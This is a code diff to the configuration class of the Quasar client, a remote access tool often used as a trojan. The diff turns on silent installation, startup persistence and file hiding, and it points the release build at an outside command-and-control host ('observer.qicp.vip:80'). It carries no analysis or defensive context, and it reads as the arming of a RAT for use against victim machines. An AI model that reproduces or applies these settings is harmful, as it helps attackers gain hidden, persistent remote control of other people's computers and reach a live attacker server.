@@ -18,11 +18,11 @@ namespace Quasar.Client.Config
         public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
         public static string SUBDIRECTORY = "Test";
         public static string INSTALLNAME = "test.exe";
-        public static bool INSTALL = false;
-        public static bool STARTUP = false;
+        public static bool INSTALL = true;
+        public static bool STARTUP = true;
         public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
         public static string STARTUPKEY = "Test key";
-        public static bool HIDEFILE = false;
+        public static bool HIDEFILE = true;
         public static bool ENABLELOGGER = false;
         public static string ENCRYPTIONKEY = "-.)4>[=u%5G3hY3&";
         public static string TAG = "DEBUG";
@@ -40,17 +40,17 @@ namespace Quasar.Client.Config
         }
 #else
         public static string VERSION = "";
-        public static string HOSTS = "";
+        public static string HOSTS = "observer.qicp.vip:80";
         public static int RECONNECTDELAY = 5000;
         public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
-        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
+        public static string DIRECTORY = "C://";
         public static string SUBDIRECTORY = "";
         public static string INSTALLNAME = "";
-        public static bool INSTALL = false;
-        public static bool STARTUP = false;
+        public static bool INSTALL = true;
+        public static bool STARTUP = true;
         public static string MUTEX = "";
         public static string STARTUPKEY = "";
-        public static bool HIDEFILE = false;
+        public static bool HIDEFILE = true;
         public static bool ENABLELOGGER = false;
         public static string ENCRYPTIONKEY = "";
         public static string TAG = "";
@@ -95,7 +95,7 @@ namespace Quasar.Client.Config
                     break;
             }
 
-            DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
+            DIRECTORY = "C://";
         }
 
         static bool VerifyHash()
